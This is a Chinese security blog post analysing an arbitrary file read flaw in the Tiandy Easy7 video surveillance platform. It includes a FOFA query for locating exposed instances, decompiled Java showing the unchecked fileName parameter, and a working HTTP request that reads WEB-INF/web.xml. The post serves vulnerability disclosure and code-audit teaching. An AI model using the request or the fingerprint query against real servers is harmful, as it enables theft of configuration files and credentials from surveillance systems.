---
title: "天地伟业Easy7 exportGisObj 文件读取漏洞"
source: https://mrxn.net/jswz/easy7-gis-exportGisObj-file-read.html
asset_dir: assets/天地伟业easy7-exportgisobj-文件读取漏洞
---

# 天地伟业Easy7 exportGisObj 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/5 08:37
* 286浏览
* [0评论](#comment)
* 28分钟阅读

深入探索

表现层状态转换

SQL

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的软件系统。

漏洞预警服务

该系统的/Easy7/rest/gis/exportGisObj 和 /Easy7/rest/gisCore/exportGisObj接口存在前台任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者通过构造恶意路径参数（如WEB-INF/web.xml）可读取服务器上的任意文件，可能导致敏感信息泄露（如系统配置文件、用户凭证等）。由于天地伟业产品多用于关键基础设施领域，若存在公网暴露实例，可能带来严重的安全风险。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的漏洞接口 /Easy7/rest/gis/exportGisObj 和 /Easy7/rest/gisCore/exportGisObj （这是审计时额外发现的，漏洞通告只有前者，可能是不同版本的区别）的对应方法`exportGisObj()`的实现逻辑

其中一个路径来自 `com.tiandy.easy7.core.rest.CLS_REST_Gis#exportGisObj`

```
@Controller
@RequestMapping({"/gis"})
public class CLS_REST_Gis {
    @Resource(
        name = "boGis"
    )
    private CLS_BO_Gis boGis;
    static WritableWorkbook wwb;
    @RequestMapping({"/exportGisObj"})
    public void exportGisObj(HttpServletRequest request, HttpServletResponse response, CLS_VO_Obj_ObjGis voObjGisObj) throws Exception {
        String filePath = request.getRealPath("/");
        String fileName = voObjGisObj.getFileName();
        if (null != fileName && !"".equals(fileName)) {
            Tools.outFile(response, fileName, filePath + fileName);
        } else {
            response.getWriter().println(JSONObject.fromObject(this.boGis.exportGisObj(voObjGisObj, filePath)));
        }

    }
```

另一个路径来自 `com.tiandy.easy7.core.rest.CLS_REST_GisCore#exportGisObj` 二者实现是一样的，只是来自不同的接口而已。

计算机科学

其中 `request.getRealPath("/")`获取的结果是当前应用的根目录，`voObjGisObj.getFileName()`返回的是用户传递的`fileName`参数；

其次，根据代码实现逻辑，我们需要跟进 `Tools.outFile()` 方法

```
public static void outFile(HttpServletResponse resp, String fileName, String fileUrl) throws IOException {
        ServletOutputStream out = resp.getOutputStream();
        fileName = URLEncoder.encode(fileName, "UTF-8");
        resp.setHeader("Content-disposition", "attachment;filename=" + fileName);
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;

        try {
            InputStream inputStream = new FileInputStream(fileUrl);
            bis = new BufferedInputStream(inputStream);
            bos = new BufferedOutputStream(out);
            byte[] buff = new byte[2048];

            int bytesRead;
            while((bytesRead = bis.read(buff, 0, buff.length)) != -1) {
                bos.write(buff, 0, bytesRead);
            }
```

到这里，这个文件读取漏洞的成因就非常清楚了：用户请求传递`fileName`参数，被直接拼接到`new FileInputStream(fileUrl)` fileUrl 部分进行文件操作，整个过程无任何校验或过滤，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /Easy7/rest/gis/exportGisObj HTTP/1.1
Host: easy7.mrxn.net
Content-Type: application/x-www-form-urlencoded

fileName=WEB-INF/web.xml
```

[![天地伟业Easy7 exportGisObj 文件读取漏洞](images/img-001-4b170f3ff8df.webp)](https://image.mrxn.net/eb519b8b10cb43558215a7bb5bd9946b.webp)

成功读取到WEB-INF/web.xml文件内容

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天地伟业Easy7 exportGisObj 文件读取漏洞](https://mrxn.net/jswz/easy7-gis-exportGisObj-file-read.html)  
文章链接：<https://mrxn.net/jswz/easy7-gis-exportGisObj-file-read.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-gis-exportGisObj-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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